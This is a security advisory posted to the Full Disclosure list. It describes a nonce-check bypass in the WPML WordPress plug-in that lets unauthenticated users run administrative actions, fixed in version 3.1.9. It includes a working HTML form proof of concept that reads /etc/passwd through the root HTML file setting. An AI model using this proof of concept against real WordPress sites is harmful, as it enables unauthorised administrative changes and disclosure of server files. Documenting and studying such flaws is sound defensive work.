
Date: Fri, 13 Mar 2015 19:08:10 +0200
From: Jouko Pynnonen <jouko@....fi>
To: fulldisclosure@...lists.org
Subject: Re: [FD] WPML WordPress plug-in SQL injection etc.

One more vulnerability reported on March 02 and fixed in version 3.1.9:


*4. Unauthenticated administrative functions*

An unauthenticated attacker may under certain conditions bypass WPML's
nonce check and perform administrative functions.

The administrative ajax functions are protected with nonces to prevent
unauthorised use. Login state is not checked. If the nonce check fails with
the $_REQUEST values, there is a secondary check that also has to fail
before the request is denied:

>
if (!( isset( $_GET[ 'icl_ajx_action' ] ) && $_GET[ 'nonce' ] ==
wp_create_nonce( $_GET[ 'icl_ajx_action' ] ) )) {
        die('Invalid nonce');
}


The problem is the mixed use of $_REQUEST and $_GET. If the above check
succeeds, subsequent code again uses $_REQUEST instead of $_GET to
determine the ajax action to perform.

If the attacker has a valid nonce generated by the target WordPress site -
from any plug-in or the core system - then they can pass the above check.
They can then define a different ajax action in POST parameters to perform
administrative functions without authentication.

An unauthenticated attacker could then execute any of the about 50 WPML
ajax actions intended for administrators only. There is a lot of choice for
manipulating or destroying data. For instance, it's possible to define a
root html file which is evaluated as

include $html_file;


This would allow reading server-side files or evaluating PHP code hosted on
remote sites (if allowed by PHP settings).

A default WordPress installation with only WPML installed apparently
doesn't generate nonces for unauthenticated users, so this is probably not
exploitable unless there are other plug-ins installed. For example bbpress
generates nonces for unauthenticated users.

>
Proof of concept:

>
<form method=POST action="
https://YOUR.WORDPRESS.BLOG/?icl_ajx_action=toggle-subscription_10&nonce=1234567890
">
<input type=hidden name="icl_ajx_action"
value="icl_save_language_negotiation_type">
<input type=hidden name="_icl_nonce" value="(ignored)">
<input type=hidden name="icl_language_negotiation_type" value="1">
<input type=hidden name="use_directory" value="1">
<input type=hidden name="show_on_root" value="html_file">
<input type=hidden name="root_html_file_path" value="/etc/passwd">
<input type=submit>
</form>


In the above example, a toggle-subscription nonce generated by bbpress is
used. It can be retrieved by unauthenticated users (go to a forum page,
view source). On submitting the form, WPML will pass the ajax action
because the bbpress nonce is valid.

> The ajax action is determined from the POST parameters. In this example,
WPML settings would be changed so that contents of /etc/passwd is shown as
the default page on the website.

This PoC was successfully tested with WPML 3.1.7.2.



-- 
Jouko Pynn√∂nen <jouko@....fi>
Klikki Oy - http://klikki.fi - Twitter: @klikkioy

_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/